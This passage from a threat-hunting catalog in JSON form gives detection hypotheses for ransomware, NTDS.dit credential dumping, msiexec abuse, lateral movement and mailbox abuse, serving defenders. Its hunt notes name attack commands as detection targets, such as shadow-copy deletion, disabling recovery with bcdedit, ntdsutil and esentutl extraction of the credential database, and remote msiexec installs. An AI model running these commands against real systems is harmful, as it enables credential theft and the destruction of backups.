    "id": "H112",
    "category": "Flames",
    "title": "An adversary is executing ransomware that rapidly encrypts files across local and network-accessible storage, indicated by a high rate of file modification events, mass file extension changes, and creation of ransom note files across multiple directories.",
    "tactic": "Impact",
    "notes": "Hunt for processes generating an abnormally high volume of file write/rename operations, creation of files with known ransomware extensions (.lockbit, .encrypted, .crypt), and identical ransom note filenames appearing in multiple directories simultaneously. Monitor for Volume Shadow Copy deletion (vssadmin delete shadows) and bcdedit modifications that often precede encryption.",
    "tags": [
      "impact",
      "ransomware",
      "encryption",
      "lockbit",
      "data_encrypted_for_impact",
      "T1486"
    ],
    "techniques": [
      "T1486"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- LockBit and other ransomware families can encrypt thousands of files per minute — in the ActiveMQ intrusion, the adversary deployed LockBit binaries via RDP to file servers and backup infrastructure with custom flags for targeted encryption paths\n- Ransomware execution is often preceded by Volume Shadow Copy deletion (T1490) and recovery service disabling (bcdedit /set recoveryenabled No) — detecting these precursor actions provides a narrow but critical window for response before encryption begins\n- LockBit's -psex flag triggers built-in PsExec-style SMB spreading, meaning a single execution can propagate across the network — detection of the initial execution on one host can prevent network-wide encryption\n- File system telemetry showing a single process performing thousands of file writes with entropy changes (plaintext to encrypted content) is a high-fidelity detection signal that produces very few false positives in normal environments",
    "references": "- [MITRE ATT&CK T1486 - Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [CISA #StopRansomware: LockBit 3.0 (AA23-075A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)\n- [CISA - Understanding Ransomware Threat Actors: LockBit (AA23-165A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)\n- [CISA - LockBit 3.0 Affiliates Exploit Citrix Bleed (AA23-325A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a)\n- [FS-ISAC - LockBit: Access, Encryption, Exfiltration, & Mitigation](https://www.fsisac.com/hubfs/Knowledge/LockBit-AccessEncryptionExfiltrationMitigation.pdf)\n- [Splunk Security Content - Detection: Common Ransomware Extensions](https://research.splunk.com/endpoint/a9e5c5db-db11-43ca-86a8-c852d1b2c0ec/)\n- [Splunk Lantern - Detecting a Ransomware Attack](https://lantern.splunk.com/Security/Use_Cases/Threat_Hunting/Detecting_a_ransomware_attack)\n- [Elastic - Ransomware Prevention with Elastic Defend](https://www.elastic.co/guide/en/security/8.19/ransomware-prevented-elastic-defend.html)",
    "file_path": "Flames/H112.md"
  },
  {
    "id": "H113",
    "category": "Flames",
    "title": "An adversary is modifying the desktop wallpaper, dropping ransom note files, or altering login screen settings via registry changes to display extortion messaging to users after ransomware deployment.",
    "tactic": "Impact",
    "notes": "Hunt for registry modifications to HKCU\\Control Panel\\Desktop\\Wallpaper and HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticecaption by non-standard processes, creation of .txt/.hta/.html files with ransom-related keywords in multiple directories simultaneously, and changes to OEMBackground registry values.",
    "tags": [
      "impact",
      "defacement",
      "ransom_note",
      "wallpaper",
      "extortion",
      "T1491.001"
    ],
    "techniques": [
      "T1491.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Desktop wallpaper modification and ransom note distribution are the visible indicators of a completed ransomware attack — in the ActiveMQ-to-LockBit intrusion, the adversary changed desktop backgrounds to ensure users were immediately aware of the ransom demand\n- While these indicators appear late in the kill chain, detecting wallpaper changes or mass file drops by a single process can trigger automated containment responses (network isolation, account disabling) that limit the scope of an ongoing encryption event\n- Ransom note creation patterns (identical files dropped in every directory traversed) provide a reliable file system indicator that can be detected by endpoint telemetry even when the ransomware binary itself evades signature-based detection\n- Modern ransomware campaigns increasingly use alternative communication channels (Session, Tox) instead of standard infrastructure — detecting the ransom note content helps identify the specific threat actor and their communication preferences for incident response coordination",
    "references": "- [MITRE ATT&CK T1491.001 - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491/001/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Red Canary Atomic Red Team - T1491.001 Internal Defacement](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1491.001/T1491.001.md)\n- [Detection.FYI - Sigma Rule: Potentially Suspicious Desktop Background Change Via Registry](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_desktop_background_change/)\n- [Detection.FYI - T1491.001 Detection Rules](https://detection.fyi/tags/attack.t1491.001/)\n- [Splunk Security Content - Detection: Modification of Wallpaper](https://research.splunk.com/endpoint/accb0712-c381-11eb-8e5b-acde48001122/)\n- [Sigma Rule - Potential Ransomware Activity Using LegalNotice Message](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_legalnotice_susp_message/)\n- [Splunk - From Registry With Love: Malware Registry Abuses](https://www.splunk.com/en_us/blog/security/from-registry-with-love-malware-registry-abuses.html)",
    "file_path": "Flames/H113.md"
  },
  {
    "id": "H114",
    "category": "Flames",
    "title": "An adversary is using SEO poisoning or malvertising to place trojanized software installers in search engine results, tricking users searching for legitimate IT tools into downloading malware-laced packages that deploy backdoors or ransomware precursors.",
    "tactic": "Initial Access",
    "notes": "Hunt for downloads of known IT administration tools (ManageEngine, PuTTY, WinSCP, AnyDesk, Teams) from domains that are not the vendor's official site. Correlate web proxy logs showing search engine referrers leading to non-vendor download domains, followed by MSI/EXE execution with suspicious child processes. Look for newly registered domains mimicking vendor names in DNS query logs.",
    "tags": [
      "initial_access",
      "seo_poisoning",
      "malvertising",
      "trojanized_installer",
      "drive_by",
      "T1189"
    ],
    "techniques": [
      "T1189"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Bumblebee-to-Akira intrusion, a user searching Bing for \"ManageEngine OpManager\" was directed to a malicious site delivering a trojanized MSI installer — this pattern is increasingly common with groups like Rhysida, Velvet Tempest, and Akira affiliates\n- SEO poisoning targets high-intent searches for IT administration tools, meaning victims are often system administrators with elevated privileges — compromising their workstation provides immediate access to infrastructure management capabilities\n- Traditional email gateway and attachment scanning controls are completely bypassed because the user initiates the download themselves through a web browser after a search engine referral\n- Post-download execution chains (MSI loading malicious DLLs, legitimate software installed alongside malware) are detectable through process lineage analysis even when the initial download evades URL filtering",
    "references": "- [MITRE ATT&CK T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Vectra - SEO Poisoning Attacks: Detection & Defense](https://www.vectra.ai/topics/seo-poisoning)\n- [Darktrace - SEO Poisoning and Fake PuTTY Sites: Investigation into the Oyster Backdoor](https://www.darktrace.com/blog/seo-poisoning-and-fake-putty-sites-darktraces-investigation-into-the-oyster-backdoor)\n- [The Hacker News - SEO Poisoning Campaign Targets 8,500+ SMB Users with Malware Disguised as AI Tools](https://thehackernews.com/2025/07/seo-poisoning-campaign-targets-8500.html)",
    "file_path": "Flames/H114.md"
  },
  {
    "id": "H115",
    "category": "Flames",
    "title": "An adversary is abusing msiexec.exe to proxy execution of malicious code through crafted MSI packages or DLL loading, bypassing application control solutions that trust the signed Windows Installer binary.",
    "tactic": "Defense Evasion",
    "notes": "Hunt for msiexec.exe executing MSI packages from unusual paths (Temp, Downloads, ProgramData, user profile directories), msiexec.exe with /q (quiet) flags installing packages from HTTP/HTTPS URLs, and msiexec.exe spawning unexpected child processes (cmd.exe, powershell.exe, rundll32.exe). Also detect msiexec.exe /y or /z switches used to load arbitrary DLLs via DllRegisterServer. Sysmon Event ID 1 (process creation) and Event ID 7 (image loaded) are key data sources.",
    "tags": [
      "defense_evasion",
      "execution",
      "msiexec",
      "signed_binary_proxy",
      "lolbin",
      "T1218.007"
    ],
    "techniques": [
      "T1218.007"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Bumblebee-to-Akira intrusion, a trojanized MSI installer loaded Bumblebee malware via DLL side-loading during what appeared to be a legitimate software installation — msiexec.exe is a signed Microsoft binary trusted by most application control solutions\n- Msiexec can fetch and install packages from remote URLs (msiexec /i http://...), enabling initial payload delivery without dropping an intermediate file to disk — a technique that bypasses many endpoint detection rules focused on file-based indicators\n- The /y and /z switches allow msiexec to load arbitrary DLLs and call their DllRegisterServer or DllInstall exports, providing a code execution primitive that does not require a full MSI package\n- MSI installations are common in enterprise environments for legitimate software deployment, making malicious usage difficult to distinguish without baselining normal MSI installation sources and parent processes",
    "references": "- [MITRE ATT&CK T1218.007 - System Binary Proxy Execution: Msiexec](https://attack.mitre.org/techniques/T1218/007/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Elastic Detection Rule - Suspicious Execution via MSIEXEC](https://www.elastic.co/guide/en/security/current/suspicious-execution-via-msiexec.html)\n- [Splunk - Windows System Binary Proxy Execution MSIExec Analytics Story](https://research.splunk.com/stories/windows_system_binary_proxy_execution_msiexec/)\n- [Splunk - Detection: MSIExec Remote Download](https://research.splunk.com/endpoint/92cbbf0f-9a6b-4e9d-8c35-cc9244a4e3d5/)\n- [Red Canary Atomic Red Team - T1218.007 Msiexec](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md)\n- [LOLBAS Project - Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)",
    "file_path": "Flames/H115.md"
  },
  {
    "id": "H116",
    "category": "Flames",
    "title": "An adversary is extracting the Active Directory NTDS.dit database from a domain controller using built-in tools such as ntdsutil, wbadmin, vssadmin, or diskshadow to obtain all domain credential hashes for offline cracking and domain-wide compromise.",
    "tactic": "Credential Access",
    "notes": "Hunt for ntdsutil.exe execution with IFM (Install From Media) arguments, wbadmin.exe start backup commands targeting system state on DCs, vssadmin create shadow on the drive containing NTDS, and diskshadow.exe script execution. Monitor Directory Service Event ID 1917 (ntds.dit backup), System Event ID 7036 (VSS service start), and Security Event ID 4688 with command-line auditing on domain controllers. Also watch for copies of ntds.dit or SYSTEM registry hive appearing in non-standard directories.",
    "tags": [
      "credential_access",
      "ntds",
      "active_directory",
      "ntdsutil",
      "wbadmin",
      "vssadmin",
      "credential_dumping",
      "T1003.003"
    ],
    "techniques": [
      "T1003.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Bumblebee-to-Akira intrusion, the adversary used wbadmin.exe to dump the NTDS.dit file from a domain controller — this single file contains every domain user's password hash, enabling offline cracking and complete domain compromise without triggering individual account lockout policies\n- NTDS.dit extraction uses signed Microsoft binaries (ntdsutil, wbadmin, vssadmin) that are pre-installed on domain controllers, making this a living-off-the-land technique that does not require dropping additional tools\n- Unlike DCSync (T1003.006) which generates replication traffic, NTDS.dit extraction via volume shadow copy or backup is a local operation on the DC that produces fewer network-based detection signals — endpoint monitoring on domain controllers is critical\n- Detection of NTDS.dit extraction is a high-fidelity signal because legitimate use of ntdsutil IFM or wbadmin system state backup on a domain controller should only occur during planned Active Directory maintenance windows",
    "references": "- [MITRE ATT&CK T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Splunk - Detection: Ntdsutil Export NTDS](https://research.splunk.com/endpoint/da63bc76-61ae-11eb-ae93-0242ac130002/)\n- [Insane Cyber - Hunting for APT28/Hafnium NTDS.dit Credential Harvesting](https://insanecyber.com/hunting-for-apt28-hafnium-ntds-dit-domain-controller-credential-harvesting-mitre-attck-t1003-003/)\n- [Red Canary Atomic Red Team - T1003.003 NTDS](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md)\n- [Security Scientist - 12 Questions and Answers About NTDS (T1003.003)](https://www.securityscientist.net/blog/ntds-t1003-003-active-directory-credential-dumping/)\n- [Detection.FYI - T1003.003 Detection Rules](https://detection.fyi/tags/attack.t1003.003/)",
    "file_path": "Flames/H116.md"
  },
  {
    "id": "H117",
    "category": "Flames",
    "title": "An adversary is aggregating collected data into a central staging directory on a compromised host — such as ProgramData, Temp, or Recycle Bin — before compressing and exfiltrating it, indicated by a process writing numerous files from disparate source locations into a single directory.",
    "tactic": "Collection",
    "notes": "Hunt for unusual file write activity in common staging directories (C:\\ProgramData, C:\\Windows\\Temp, %APPDATA%, Recycle Bin, C:\\perflogs). Look for archive creation (7z.exe, rar.exe, zip utilities) in these locations, especially when preceded by file aggregation from multiple source directories. Monitor for command-line tools copying files with extensions associated with sensitive data (.docx, .xlsx, .pdf, .pst, .csv, .sql) into a single destination. Endpoint file creation telemetry and process command-line auditing are key data sources.",
    "tags": [
      "collection",
      "data_staging",
      "exfiltration_prep",
      "archive",
      "T1074.001"
    ],
    "techniques": [
      "T1074.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Bumblebee-to-Akira intrusion, the adversary staged reconnaissance output and collected data in ProgramData directories before exfiltrating via FileZilla SFTP — this staging step is a detectable precursor that provides a window for response before data leaves the network\n- Data staging is a prerequisite for most exfiltration operations — detecting the aggregation phase gives defenders an opportunity to intervene before data loss occurs, which is especially critical when exfiltration tools like FileZilla or rclone have already been deployed\n- Legitimate software rarely aggregates files from disparate locations into ProgramData, Temp, or Recycle Bin directories — this behavior is anomalous and produces few false positives when baselined against normal application activity\n- Archive creation (7zip, RAR, WinRAR) in staging directories, especially by processes that do not normally perform archival operations, is a high-confidence indicator of pre-exfiltration activity",
    "references": "- [MITRE ATT&CK T1074.001 - Data Staged: Local Data Staging](https://attack.mitre.org/techniques/T1074/001/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Splunk Lantern - Detecting Data Exfiltration Activities](https://lantern.splunk.com/Security/UCE/Guided_Insights/Anomaly_detection/Detecting_data_exfiltration_activities)\n- [MITRE D3FEND - Local Data Staging T1074.001](https://d3fend.mitre.org/offensive-technique/attack/T1074.001/)\n- [Red Canary Atomic Red Team - T1074.001 Local Data Staging](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md)\n- [Security Scientist - 12 Questions and Answers About Data Staged (T1074)](https://www.securityscientist.net/blog/12-questions-and-answers-about-data-staged-t1074-2/)\n- [Jai Minton - MITRE ATT&CK Analysis T1074.001 Local Data Staging](https://www.jaiminton.com/Mitreatt&ck/T1074)",
    "file_path": "Flames/H117.md"
  },
  {
    "id": "H118",
    "category": "Flames",
    "title": "An adversary is impersonating IT helpdesk personnel via Microsoft Teams external messaging to socially engineer users into launching remote access tools like Quick Assist, enabling hands-on-keyboard intrusion from a cross-tenant attacker-controlled account.",
    "tactic": "Initial Access",
    "notes": "Defender XDR Advanced Hunting (primary approach): Use CloudAppEvents where Application == \"Microsoft Teams\" and ActionType == \"ChatCreated\" with RawEventData.ParticipantInfo.HasForeignTenantUsers == true and CommunicationType == \"OneOnOne\" — filter on display names impersonating support roles (\"Help Desk\", \"Microsoft Security\", \"IT Support\"). Cross-join with DeviceProcessEvents to correlate the target user launching QuickAssist.exe, AnyDesk.exe, ScreenConnect, or TeamViewer.exe within 30 minutes. The source article provides a full KQL query (Query A) that joins MessageEvents with DeviceProcessEvents on VictimAccountObjectId within a 30-minute window. Quick Assist-anchored recon detection (Query J): Join RMM tool launches with immediate reconnaissance commands (whoami, systeminfo, ipconfig, nltest, net user) within 10 minutes. Email bombing precursor (Query from Storm-1811): Use EmailEvents with series_decompose_anomalies to detect inbound email volume spikes (AnomalyScore >= 10) — attackers flood the inbox before calling as \"helpdesk\" to remediate. Also monitor for external Teams chats from recently registered domains or tenants using ParticipatingDomains/ParticipatingSIPDomains fields.",
    "tags": [
      "initial_access",
      "phishing_via_service",
      "teams",
      "social_engineering",
      "T1566.003"
    ],
    "techniques": [
      "T1566.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Cross-tenant Teams phishing bypasses email security controls entirely — attackers initiate contact from separate tenants posing as internal support, and users are conditioned to trust helpdesk requests received through corporate messaging platforms\n- The attack chain produces a tight behavioral sequence (Teams message → Quick Assist launch → immediate recon burst) that is highly anomalous and detectable when correlated across M365 and endpoint telemetry\n- Quick Assist grants elevation to the remote user, enabling immediate payload staging in ProgramData, DLL sideloading through trusted applications, and lateral movement via WinRM — detecting the initial social engineering phase prevents downstream compromise\n- Microsoft has documented multiple threat actors (Storm-1811, others) actively exploiting this vector in production environments, making it a high-priority hunt for organizations with external Teams collaboration enabled",
    "references": "- [MITRE ATT&CK T1566.003 - Phishing: Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003/)\n- [Microsoft Security Blog - Cross-Tenant Helpdesk Impersonation to Data Exfiltration (includes 10 KQL queries)](https://www.microsoft.com/en-us/security/blog/2026/04/18/crosstenant-helpdesk-impersonation-data-exfiltration-human-operated-intrusion-playbook/)\n- [Microsoft Security Blog - Storm-1811: Quick Assist Social Engineering Leading to Ransomware](https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/)\n- [KQL Search - Hunting One-on-One Teams Chats by External Domains](https://www.kqlsearch.com/query/Hunting%20Oneonone%20Chats%20By%20Domains&cm7wmcuo600w6p10fs17t3i4w)\n- [Microsoft Learn - CloudAppEvents Table Schema](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-cloudappevents-table)\n- [Hunters Security - Detecting Microsoft Teams Phishing: Hunting the Fake IT Helpdesk Threat](https://www.hunters.security/en/blog/microsoft-teams-phishing-fake-it-helpdesk)\n- [Rapid7 - Guidance on Observed Microsoft Teams Phishing Campaigns](https://www.rapid7.com/blog/post/dr-guidance-on-observed-microsoft-teams-phishing-campaigns/)",
    "file_path": "Flames/H118.md"
  },
  {
    "id": "H119",
    "category": "Flames",
    "title": "An adversary is using PsExec or similar tools to laterally move via SMB administrative shares (C$, ADMIN$), indicated by service installation events on remote hosts and authenticated SMB connections from a single source to multiple destinations in a short timeframe.",
    "tactic": "Lateral Movement",
    "notes": "Hunt for Windows Event ID 7045 (new service installed) with service names matching PsExec patterns (PSEXESVC) or random-character names. Correlate with Sysmon Event ID 3 or firewall logs showing SMB (TCP 445) connections from a single host to multiple destinations. Monitor for Sysmon Event ID 17/18 (pipe created/connected) for PsExec's named pipe (\\\\.\\pipe\\PSEXESVC). Check Windows Security Event ID 5145 (network share object access) for ADMIN$ and C$ share access from non-admin workstations. Monitor for Impacket's atexec.py artifacts including cmd.exe spawned by services.exe with /C flags, and CrackMapExec/NetExec SMB execution patterns. Look for failed authentication attempts (Event ID 4625) across admin shares from a single source — this may indicate password spray preceding lateral movement.",
    "tags": [
      "lateral_movement",
      "smb",
      "admin_shares",
      "psexec",
      "T1021.002"
    ],
    "techniques": [
      "T1021.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Microsoft domain compromise case, the attacker used PsExec and Impacket's atexec.py with password-sprayed credentials to pivot across at least 14 servers through password reuse — this fan-out pattern across admin shares is highly anomalous in most environments\n- SMB lateral movement via admin shares is one of the most common post-exploitation techniques and a prerequisite for domain-wide ransomware deployment — detecting it early in the kill chain can prevent escalation from a single compromised host to full domain compromise\n- PsExec creates a named pipe and installs a temporary service on the remote host, producing Event ID 7045 artifacts that are durable and difficult for attackers to suppress without significant operational overhead\n- Legitimate admin share usage follows predictable patterns (SCCM, backup agents, specific admin workstations) that can be baselined, making unauthorized access detectable with low false-positive rates",
    "references": "- [MITRE ATT&CK T1021.002 - Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)\n- [Microsoft Security Blog - Containing a Domain Compromise: How Predictive Shielding Shut Down Lateral Movement](https://www.microsoft.com/en-us/security/blog/2026/04/17/domain-compromise-predictive-shielding-shut-down-lateral-movement/)\n- [Red Canary - SMB/Windows Admin Shares Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/)\n- [Splunk - Executable File Written in Administrative SMB Share](https://research.splunk.com/endpoint/f63c34fe-a435-11eb-935a-acde48001122/)\n- [Elastic - PsExec Network Connection Detection Rule](https://www.elastic.co/guide/en/security/current/psexec-network-connection.html)\n- [Red Canary Atomic Red Team - T1021.002 SMB/Windows Admin Shares](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md)",
    "file_path": "Flames/H119.md"
  },
  {
    "id": "H120",
    "category": "Flames",
    "title": "An adversary is executing commands on remote hosts via WMI or DCOM, indicated by wmiprvse.exe spawning unexpected child processes or remote WMI connections targeting identity infrastructure such as Entra Connect servers.",
    "tactic": "Lateral Movement",
    "notes": "Hunt for wmiprvse.exe spawning cmd.exe, PowerShell, or other execution engines (Sysmon Event ID 1). Correlate with network connections on RPC/DCOM ports (TCP 135, 49152-65535) from non-admin workstations. Check Windows Security Event ID 4648 (logon with explicit credentials) paired with WMI activity — this reveals the credential used for remote WMI execution. Monitor WMI activity logs (Microsoft-Windows-WMI-Activity/Operational) for Win32_Process Create method invocations, especially with encoded or obfuscated command lines (Impacket WmiExec pattern). Pay special attention to WMI connections targeting Entra Connect, ADFS, or PKI servers, as these indicate attempts to access identity synchronization credentials. Also monitor for WinRM (ports 5985/5986) activity from the same source hosts, as attackers often use WMI and WinRM interchangeably.",
    "tags": [
      "lateral_movement",
      "dcom",
      "wmi",
      "wmiexec",
      "T1021.003"
    ],
    "techniques": [
      "T1021.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the domain compromise case, the attacker used Impacket's WmiExec specifically against Entra Connect servers to attempt extraction of synchronization credentials — this targeting of identity infrastructure via WMI is a high-severity indicator of impending domain-wide compromise\n- WMI-based lateral movement leaves fewer artifacts than PsExec (no service installation), making it attractive to sophisticated attackers but still detectable through process lineage analysis of wmiprvse.exe child processes\n- DCOM/WMI remote execution is a core capability of offensive toolkits like Impacket, CrackMapExec, and Cobalt Strike — hunting for these patterns catches a wide range of threat actors regardless of specific tooling\n- Legitimate WMI remote management follows predictable patterns (SCCM, monitoring agents) that can be baselined to surface anomalous remote execution",
    "references": "- [MITRE ATT&CK T1021.003 - Remote Services: Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003/)\n- [Microsoft Security Blog - Containing a Domain Compromise: How Predictive Shielding Shut Down Lateral Movement](https://www.microsoft.com/en-us/security/blog/2026/04/17/domain-compromise-predictive-shielding-shut-down-lateral-movement/)\n- [Splunk - Remote Process Instantiation via DCOM and PowerShell Script Block](https://research.splunk.com/endpoint/fa1c3040-4680-11ec-a618-3e22fbd008af/)\n- [Elastic - Incoming DCOM Lateral Movement with ShellBrowserWindow](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/lateral_movement_dcom_shellwindow_shellbrowserwindow)\n- [Detection.FYI - Remote DCOM/WMI Lateral Movement Sigma Rule](https://detection.fyi/sigmahq/sigma/application/rpc_firewall/rpc_firewall_remote_dcom_or_wmi/)\n- [Red Canary Atomic Red Team - T1021.003 Distributed Component Object Model](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.md)",
    "file_path": "Flames/H120.md"
  },
  {
    "id": "H121",
    "category": "Flames",
    "title": "An adversary is remotely creating scheduled tasks on domain controllers to execute NTDS.dit snapshot or credential harvesting operations, indicated by schtasks.exe or at.exe creating tasks under SYSTEM context on DC hostnames.",
    "tactic": "Execution",
    "notes": "Hunt for Windows Security Event ID 4698 (scheduled task created) on domain controllers, especially tasks executing ntdsutil.exe, vssadmin.exe, esentutl.exe, DiskShadow.exe, makecab.exe, or PowerShell scripts. Correlate with Event ID 4688 (process creation) showing schtasks.exe with /create /s flags targeting remote DC hostnames. Monitor for Event ID 4699 (scheduled task deleted) shortly after 4698 — attackers typically create, execute, and delete the task within minutes to minimize forensic artifacts. Check Task Scheduler Operational Log Event IDs 106 (task registered), 200 (action started), 201 (action completed) for the full execution timeline. NTDS harvesting chain: The attacker needs both ntds.dit AND the SYSTEM registry hive to decrypt credentials — hunt for ntdsutil \"ac i ntds\" \"ifm\" \"create full\" commands, or vssadmin \"create shadow /for=C:\" followed by copy operations targeting \\Windows\\NTDS\\ntds.dit and \\Windows\\System32\\config\\SYSTEM. Also monitor for esentutl.exe /y /vss (direct VSS-aware copy) and DiskShadow.exe script-based extraction. Look for Directory Service Event ID 1917 (ntds.dit backup notification) and makecab.exe compressing NTDS-related files for staging. Cross-reference with T1003.003 (NTDS credential dumping) — the scheduled task is the execution vehicle, but the objective is domain credential harvesting.",
    "tags": [
      "execution",
      "persistence",
      "scheduled_task",
      "domain_controller",
      "ntds",
      "T1003.003",
      "T1053.005"
    ],
    "techniques": [
      "T1003.003",
      "T1053.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the domain compromise case, the attacker remotely created a scheduled task on a domain controller to initiate NTDS snapshot activity and used makecab.exe to package the output — this is a critical step in obtaining all domain credentials and must be detected immediately\n- Scheduled task creation on domain controllers is rare in most environments and almost always represents either administrative maintenance (which follows change windows) or adversary activity — the signal-to-noise ratio is excellent for hunting\n- Remote scheduled task creation combines execution and persistence in a single action, and when targeting DCs specifically, it indicates the attacker has already obtained privileged credentials and is pursuing domain dominance\n- The ntdsutil IFM workflow produces specific artifacts (snapshot creation, cab file output) that are distinct from normal DC operations and can be hunted with high confidence",
    "references": "- [MITRE ATT&CK T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)\n- [MITRE ATT&CK T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)\n- [Microsoft Security Blog - Containing a Domain Compromise: How Predictive Shielding Shut Down Lateral Movement](https://www.microsoft.com/en-us/security/blog/2026/04/17/domain-compromise-predictive-shielding-shut-down-lateral-movement/)\n- [Splunk - Ntdsutil Export NTDS](https://research.splunk.com/endpoint/da63bc76-61ae-11eb-ae93-0242ac130002/)\n- [Splunk - Windows OS Credential Dumping with Ntdsutil Export NTDS](https://research.splunk.com/endpoint/dad9ddec-a72a-47be-87b6-a0f7ba98ed6e/)\n- [HackTheBox - NTDS Dumping Attack Detection](https://www.hackthebox.com/blog/ntds-dumping-attack-detection)\n- [Red Canary Atomic Red Team - T1003.003 OS Credential Dumping: NTDS](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md)\n- [Detection.FYI - Schtasks Creation or Modification with SYSTEM Privileges](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_schtasks_system/)\n- [WA Cyber Security Unit - T1003.003 NTDS Hunt Guidance](https://soc.cyber.wa.gov.au/guidelines/TTP_Hunt/ADS_forms/T1003.003-OS-Credential-Dumping-NTDS/)",
    "file_path": "Flames/H121.md"
  },
  {
    "id": "H122",
    "category": "Flames",
    "title": "An adversary is abusing Exchange mailbox permissions to gain broad access to organizational email, indicated by Add-MailboxPermission or ApplicationImpersonation role assignments granting a single account access to multiple mailboxes.",
    "tactic": "Collection",
    "notes": "Exchange/On-Prem: Hunt in Exchange Admin Audit Logs and M365 Unified Audit Logs for Add-MailboxPermission cmdlet executions granting FullAccess to a non-standard delegate. Monitor for New-ManagementRoleAssignment operations adding ApplicationImpersonation roles — use `Get-ManagementRoleAssignment -Role ApplicationImpersonation -GetEffectiveUsers` to enumerate current holders. Also check Add-MailboxFolderPermission for subtler folder-level delegation grants. MailItemsAccessed (E5/E3): Hunt for MailItemsAccessed audit events showing a single account or service principal accessing messages across multiple mailboxes — this covers all protocols (EWS, MAPI, REST, POP, IMAP, ActiveSync). Note: throttling kicks in at 1,000+ events in 24 hours, which is itself an indicator of bulk collection. Graph API / OAuth abuse: Monitor for Entra ID app registrations or consent grants with Mail.Read or Mail.ReadWrite application-level permissions (not delegated). Hunt for service principals with full_access_as_app Exchange role — Midnight Blizzard used an abandoned OAuth app with this role to read employee mailboxes. Check CloudAppEvents for EWS or Graph API access from service principals that don't normally access mail. Look for remote PowerShell sessions to Exchange from unusual source IPs or through Impacket atexec.py execution chains.",
    "tags": [
      "collection",
      "email_collection",
      "exchange",
      "mailbox_delegation",
      "oauth",
      "T1114.002"
    ],
